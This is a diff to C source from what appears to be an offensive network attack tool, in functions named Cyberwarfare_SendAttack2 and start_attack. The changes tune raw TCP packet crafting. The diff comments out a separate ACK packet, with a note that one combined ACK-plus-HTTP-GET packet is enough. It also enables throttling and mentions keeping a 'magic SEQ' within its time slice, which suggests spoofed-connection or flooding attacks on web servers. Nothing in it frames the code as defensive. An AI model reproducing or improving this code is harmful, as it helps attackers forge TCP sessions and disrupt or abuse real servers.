@@ -366,6 +366,10 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     char req_data[] = "GET / HTTP/1.0\r\n\r\n";
     int req_data_size = sizeof(req_data);
 
+/*
+
+    // WOW.. at it goes you dont even need 2 packets to perform the attack.. just a single.. ACK+Request in same packet is enough.
+    
     // build ACK for the servers SYN|ACK
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
     if (!bptr) return 0;    
@@ -378,7 +382,7 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
 
     // free first packet
     PacketBuildInstructionsFree(bptr);
-
+*/
     // now build packet for http request (GET .....)
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
     if (!bptr) return 0;    
@@ -479,7 +483,7 @@ void start_attack(AS_context *ctx) {
             }
         } else {
             skip--;
-            printf("skip %d\n",skip);
+            
         }
 
         // push packets as quickly as possible if it takes more  than 1 second to send them all... otherwise our magic SEQ falls out of its time slice
@@ -495,7 +499,7 @@ void start_attack(AS_context *ctx) {
 
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
         if (!(count++ % 500)) {
-            //skip = 5;
+            skip = 5;
         }
         //sleep(10);
     }
